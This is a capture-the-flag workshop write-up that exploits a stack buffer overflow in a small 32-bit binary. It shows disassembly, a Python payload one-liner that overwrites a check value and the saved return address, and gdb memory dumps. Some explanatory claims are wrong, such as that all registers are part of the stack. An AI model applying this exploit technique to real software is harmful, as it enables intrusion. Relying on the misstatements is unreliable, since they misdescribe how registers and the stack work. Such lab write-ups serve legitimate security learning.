It was a discovery and a very enlightening process to finding the solution to this process. Everytime you solve a question, you
learn something new about how a computer functions. Since I couldn't find any write-ups for this Kaabla-CTF-Workshop (Thank God), 
I had to do this on my own.

SEGFAULT. Then what?

Dump of assembler code for function func:
   0x080484d4 <+0>:     push   %ebp
   0x080484d5 <+1>:     mov    %esp,%ebp
   0x080484d7 <+3>:     sub    $0x58,%esp
   0x080484da <+6>:     movl   $0x0,-0xc(%ebp)
   0x080484e1 <+13>:    sub    $0x8,%esp
   0x080484e4 <+16>:    lea    -0x4c(%ebp),%eax
   0x080484e7 <+19>:    push   %eax
   0x080484e8 <+20>:    push   $0x80485d2
   0x080484ed <+25>:    call   0x80483a0 <__isoc99_scanf@plt>
   0x080484f2 <+30>:    add    $0x10,%esp
   0x080484f5 <+33>:    cmpl   $0xdeadbeef,-0xc(%ebp)
   0x080484fc <+40>:    je     0x8048518 <func+68>
   0x080484fe <+42>:    sub    $0xc,%esp
   0x08048501 <+45>:    push   $0x80485d5
   0x08048506 <+50>:    call   0x8048350 <puts@plt>
   0x0804850b <+55>:    add    $0x10,%esp
   0x0804850e <+58>:    sub    $0xc,%esp
   0x08048511 <+61>:    push   $0x0
   0x08048513 <+63>:    call   0x8048380 <exit@plt>
   0x08048518 <+68>:    nop
   0x08048519 <+69>:    leave
=> 0x0804851a <+70>:    ret


Now how to exploit this?
We know that leave == mov esp,ebp; pop ebp;
             ret == pop eip
Armed with this knowledge, lets go

 echo $(python -c 'print "A"*64 + "\xef\xbe\xad\xde" + "C"*12 + "\xab\x84\x04\x08"') > inp
 (gdb) r < inp

This is how memory looks like:

(gdb) x/100xw $ebp-76
0xbffffb8c:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffffb9c:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffffbac:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffffbbc:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffffbcc:     0xdeadbeef      0x43434343      0x43434343      0x43434343
0xbffffbdc:     0x080484ab      0xb7fb7400      0xbffffc00      0x00000000
0xbffffbec:     0xb7e1c70e      0x00000000      0x080483b0      0x00000000

EBP register is used as an offset to address local variables on the system.
Our input starts at 0xbffffb8c. Note that this is part of the stack. All registers are part of the stack, and stack is only
8 MB!!
We can cleanly overwrite 0xdeadbeef

Now comes the tricky part.
12 bytes from ebp is esp, the stack pointer.


   0x080484f5 <+33>:    cmpl   $0xdeadbeef,-0xc(%ebp)
   0x080484fc <+40>:    je     0x8048518 <func+68>
   0x080484fe <+42>:    sub    $0xc,%esp
   0x08048501 <+45>:    push   $0x80485d5
   0x08048506 <+50>:    call   0x8048350 <puts@plt>
   0x0804850b <+55>:    add    $0x10,%esp
   0x0804850e <+58>:    sub    $0xc,%esp
   0x08048511 <+61>:    push   $0x0
   0x08048513 <+63>:    call   0x8048380 <exit@plt>
=> 0x08048518 <+68>:    nop
   0x08048519 <+69>:    leave
   0x0804851a <+70>:    ret
End of assembler dump.
(gdb) stepi
0x08048519 in func ()
(gdb) x/xw $ebp
0xbffffbd8:     0x43434343
(gdb) stepi
0x0804851a in func ()
(gdb) x/xw $ebp
0x43434343:     Cannot access memory at address 0x43434343
(gdb) p $esp
$21 = (void *) 0xbffffbdc
(gdb) x/xw $esp
0xbffffbdc:     0x080484ab


See PNG now for more info.
Bottom line: whatever we want on top of stack to go into EIP, we must put it at EBP + 4, not directly EBP.
